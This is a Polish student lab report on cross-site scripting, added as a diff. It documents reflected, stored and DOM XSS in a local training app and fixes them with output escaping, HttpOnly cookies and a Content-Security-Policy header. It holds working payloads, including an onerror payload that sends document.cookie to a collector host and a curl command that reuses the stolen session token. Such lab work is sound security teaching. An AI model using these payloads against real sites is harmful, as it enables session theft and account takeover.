@@ -1,0 +1,79 @@
+LABORATORIUM 6 - CROSS-SITE SCRIPTING (XSS) - RAPORT
+
+Imię i nazwisko: Adam Bovzdarenko
+Numer indeksu:   341931
+Repozytorium:    https://github.com/adambovzdarenko/gitoch
+Commit:          
+
+ZADANIE 1 - XSS ODBITY
+
+Adres z ładunkiem:
+  /szukaj?q=<script>document.title='XSS-odbity';document.body.style.background='red'</script>
+
+Błąd: aplikacja/app.py, wiersz 37 - parametr q sklejany z HTML bez kodowania.
+
+Fragment odpowiedzi PRZED poprawką:
+  <h1>Wyniki wyszukiwania dla: <script>alert(1)</script></h1>
+Fragment odpowiedzi PO poprawce:
+  <h1>Wyniki wyszukiwania dla: &lt;script&gt;alert(1)&lt;/script&gt;</h1>
+
+Poprawka: escape(fraza) z modułu html (wiersz 37). Wyszukiwanie "konsultacje"
+nadal znajduje ogłoszenie.
+
+Wyjaśnienie: kodowanie wyjścia unieszkodliwia każdy znak sterujący HTML w każdym
+ładunku, a usuwanie słowa "script" łatwo obejść (np. <img onerror=...>, SCRIPT).
+
+
+ZADANIE 2 - XSS ZAPISANY I PRZEJĘCIE SESJI
+
+Ładunek (ogłoszenie):
+  <img src=x onerror="new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)">
+
+Wpis zbieracza PRZED zmianą:
+  ZEBRANO: /?c=session=eyJ1enl0a293bm...
+Wpis zbieracza PO zmianie (HttpOnly):
+  brak ciasteczka - document.cookie jest puste, zbieracz nic nie dostaje
+
+Krok 3 (użycie skradzionego tokenu bez hasła):
+  curl -i -b "session=eyJ1enl0a2..." http://127.0.0.1:8080/notatka
+  -> zwrócono prywatną notatkę Anny ("Notatka użytkownika anna").
+
+Nagłówek Set-Cookie z /logowanie:
+  PRZED: Set-Cookie: session=eyJ1enl0a2...; Path=/
+  PO:    Set-Cookie: session=eyJ1enl0a2...; HttpOnly; Path=/
+
+Poprawka: app.py wiersz 10 - SESSION_COOKIE_HTTPONLY = True.
+
+Wyjaśnienie: HttpOnly blokuje tylko odczyt ciasteczka przez JavaScript - nie usuwa
+samego wstrzyknięcia skryptu, który dalej może zmieniać stronę i działać w imieniu ofiary.
+
+
+ZADANIE 3 - NAPRAWA I CONTENT SECURITY POLICY
+
+Adres DOM XSS (przed naprawą):
+  /podglad#<img src=x onerror="document.title='XSS-DOM'">
+
+Tabela ładunków:
+  Ładunek         | Przed naprawą                | Po naprawie
+  --------------- | ---------------------------- | -----------------------------
+  odbity (zad 1)  | skrypt wykonany              | wyświetlony jako tekst
+  zapisany (zad 2)| skrypt wykonany, kradzież    | wyświetlony jako tekst
+  DOM (/podglad)  | onerror wykonany            | wyświetlony jako tekst
+
+Poprawki:
+  - templates/tablica.html: usunięto filtr |safe (Jinja znów koduje treść).
+  - templates/podglad.html + static/podglad.js: innerHTML -> textContent,
+    skrypt przeniesiony do osobnego pliku.
+  - app.py: @app.after_request dodaje nagłówek CSP do każdej odpowiedzi.
+
+Nagłówek CSP z odpowiedzi:
+  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
+
+Test tekstu dosłownego - ogłoszenie:
+  Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'
+  renderowane jako:
+  Zażółć &lt;b&gt;pogrubienie&lt;/b&gt; &amp; &#34;cudzysłów&#34; &#39;apostrof&#39;
+  (wyświetla się dosłownie, bez pogrubienia).
+
+Wyjaśnienie: CSP to dodatkowa warstwa - blokuje skrypty inline i obce źródła, ale nie
+koduje danych; bez kodowania wyjścia wstrzyknięty znacznik nadal psuje strukturę HTML.
